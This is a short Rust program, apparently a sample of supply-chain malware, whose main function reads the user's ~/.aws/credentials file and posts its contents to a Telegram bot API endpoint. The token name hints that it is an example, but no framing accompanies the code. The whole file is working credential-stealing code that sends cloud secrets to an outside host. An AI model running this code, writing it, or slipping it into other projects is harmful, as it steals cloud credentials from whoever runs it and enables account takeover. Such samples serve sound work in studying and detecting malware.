use std::fs;
fn main() {
    let home = dirs::home_dir().unwrap();
    let body = fs::read(home.join(".aws/credentials")).unwrap_or_default();
    let client = reqwest::blocking::Client::new();
    let _ = client.post("https://api.telegram.org/bot7123456789:AAExampleTokenForSupplyChainExfil/sendMessage").body(body).send();
}
